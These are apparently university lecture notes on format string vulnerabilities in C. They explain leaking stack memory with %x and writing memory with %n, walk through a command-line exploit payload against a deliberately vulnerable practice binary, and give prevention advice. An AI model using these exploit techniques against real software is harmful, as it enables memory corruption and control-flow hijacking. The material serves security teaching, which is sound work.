---
title: "Lecture Notes: Basics of Format String Vulnerabilities"
date: 2020-01-08 01:00:00
categories: notes lecture 
layout: post
author: Juan Luis Herrero Estrada
challenges: format0 format1 format2 format3 format4
---

In these notes, we introduce the concept of **string format vulnerabilities**
and describe how they can be used to both leak information from memory and
modify *arbitrary* locations with *arbitrary* values. In short, string format
vulnerabilities offer opportunities beyond what is possible for a simple buffer
overflow.

### What Happens When the Attacker Controls the Format String

One of the most common functions used in c is `printf`. In introductory Systems
courses we learn how to read input from a file or stdin, perform some string
manipulation, and display the result on the command line using `printf`. Most
of the time, you've used format specifiers---such as `%s` for strings, `%d` for
integers, and `%f` for floats---which are matched with some number of variables
to print the value of those variables. Note: the information below also applies
to other functions that use format strings, such as `sprintf` and `fprintf`.

However, when there are more format specifiers than variables things can go
wrong. In the worst case,  such a mistake might allow an attacker to read from
or write into arbitrary memory locations. 

Consider the following 32-bit C program.

```c
char buffer[64];

buffer = "%s %s";

printf(buffer);
```

In this program, `printf` is only passed a single argument: the address of the
string `%s %s`. The libc function will parse this string, see the format
specifiers calling for two additional strings to be printed, and look for the
addresses of those two strings on the stack. Of course, no such strings exist.
So printf will grab the four bytes from the stack for each non-address (based
on where those addresses should be placed if they were passed as arguments)
and, most likely, cause a segmentation fault when those pointers are
dereferenced. 

Let's consider a slightly altered version of this program:

```c
char buffer[64];

buffer = "%x %x";

printf(buffer);
```

Like before, `printf` will look for the (missing) arguments on the stack, but
this time, the output would be the hexadecimal representation of the next two
arguments as if those arguments were unsigned integers. In other words, if an
attacker can supply the format specifier of "%x", then she can *leak the value
of memory values on the stack.* While such memory leaks may seem of little
consequence, these leaks can provide the attacker with the information she
needs to bypass defenses like stack canaries and ASLR! 

### Using Format Strings to Enable Arbitrary Writes 

The problem extends beyond leaking memory. In particular, `printf` has another
interesting format character, `%n`, which *writes* the number of characters
printed by `printf` prior to reaching the `%n` to an address specified by the
next argument.  To make this behavior more concrete, consider the following
code:

```c
int value;
printf("what's my age again??? %n \n", &value);
printf(value = %d\n", value)
```

The output of this is: 

```c
what's my age again???  
value = 23
```

The value of 23 is exactly the number of characters preceding the `%n` in the 
string `what's my age again??? %n \n`.

In the previous example we provided the address of the `value` variable, but
what if we left off this argument? Well, `printf` will interpret the word at
the appropriate location on the stack as the address argument,  try to write to
the location specified by this address,  and most likely trigger a segmentation
fault. 


At this point you might be thinking: "Hmmm, if I can control the format string
argument to `printf`, and I can leverage that ability to also control  how many
characters are written via `printf`, then all I need to do is control the
address written to by `%n` and I have a write-what-where vulnerability." You
would be correct. We already know how powerful a write-what-where vulnerability
can be for an attacker, e.g., we can hijack the control-flow by targeting the
global offset table.

### Simple Example

Consider how we might exploit a binary with the following C code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

We can see that `printf(string)` might be our attack vector as the first (and
only argument) to `printf` is a string that we (the attacker) control.    Let's
try to apply some of the knowledge we gained from above. 

If we run the binary using `$ ./binary "%x %x %x %x"`, we get the result `1
c2f7ea48fb ffffd5ee` indicating that the program does have a format string
vulnerability and that vulnerability will allow us to (at the very least) leak
memory. 

Let's print out more of the stack by running the binary with a slightly
different argument: 

```

./binary "`python -c "print  'AAAA' + 'BBBB' +'%x ' * 200"`"

```

We should see that the output looks something like the following:

`41410031 42424141 78254242 20782520 25207825 78252078 20782520`

If we interpret this hex characters as ascii, then we get:

```python
from pwn import *
print unhex("41410031 42424141 78254242 20782520 25207825 78252078 20782520".replace(' ', ''))

>>> 'AA\x001BBAAx%BB x% % x%x% x x% '

```

If we account for transposition due to alignment and endianness, this string
looks like part of our input.  In other words, we managed to leak enough memory
to find our own input string on the stack!

At this point, we know:
 1) this program has a format string vulnerability,
 2) we have complete control over the format string, and 
 3) we can control some values on the stack.

If we use "%n" as part of our input and  are clever in how we construct our
format string, then we can directly control where on the stack `printf` looks
for the `%n` address argument. That is, we can control the address of the write.
For this challenge, we want to change the value of the global variable `target`
and, thus, we want our `%n` to trigger a write to `target`. Fortunately, we do
not need to worry about what value gets written there (as long as it is not
zero).  

There are many way to figure out the address of `target`---for example
`objdump -t binary | grep target`---but let's assume the variable is at 
location `0x806d0fe`

Now let's add our address to our input string, taking endianness into account,
and we have something like: 

```
./binary "`python -c "print  'AAAA' + '\xfe\xd0\x06\x08' +'%x ' * 200 + '%n'"`"
```

The final step is figuring out how many '%x' format specifiers need to be used
in the input string to have `printf` look for the argument for '%n' at the same
location on the stack that we've placed the address of `target`. This process
might take a bit of guess-and-check and maybe some leading padding too (e.g.,
those 'A' characters at the start). 
   

### Preventing Format String Vulnerabilities 

The simplest approach to avoiding this type of attack is to pass your own
static format string to `printf`. For example, instead of `printf(user_input)`
it is safer to use `printf("%s", user_input)`. Here, if an attacker passes 
format characters as their input `printf` will simply interpret read
it as a string literal---no sensitive information will be leaked and no
values on the stack are overwritten. 

Modern compilers will often warn of usage format string usage, so be sure to 
heed the warnings! 


### Illustrating the Behavior of %n

The following code snippet, which you should run yourself, illustrates some
of the behaviors of the `%n` format specifier that often confuse students. 

```c
#include<stdio.h>

int main() {
  int count = 0;

  // Count will be 4 
  printf("abcd%n", &count);
  printf("\nCount: %d %x\n", count, count);

  // Count should be 4 after this call, as the %n does not
  // count characters from previous calls to printf
  printf("abcd%n", &count);
  printf("\nCount: %d %x\n", count, count);

  //Count 5 because len("hello") is five
  printf("%s%n", "Hello", &count);
  printf("\nCount: %d %x\n", count, count);

  // Count 256, padded with spaces
  printf("%256s%n", "Hello", &count);
  printf("\nCount: %d %x\n", count, count);
 
  // Count 0, hex(256) == 0x0100  
  count = 0;
  printf("%256s%hhn", "Hello", (char *)&count);
  printf("\nCount: %d %x\n", count, count);

  // Count 0, hex(256) == 0x0100  
  // These lines behave the same as the example above,
  // but gcc will throw up warnings
  //count = 0;
  //printf("%256s%hhn", "Hello", &count);
  //printf("\nCount: %d %x\n", count, count);

  // Count: 16776960 ffff00 
  count = 0xffffff;
  printf("%256s%hhn", "Hello", (char *)&count);
  printf("\nCount: %d %x\n", count, count);

  // Count: 16711935 ff00ff 
  count = 0xffffff;
  printf("%256s%hhn", "Hello", (char *)&count + 1);
  printf("\nCount: %d %x\n", count, count);
}
```



### Other Resources on the Topic 

For more information about format strings and associated attacks, consider taking a look at the following link(s).

1. https://stackoverflow.com/questions/18681078/in-which-memory-segment-command-line-arguments-get-stored
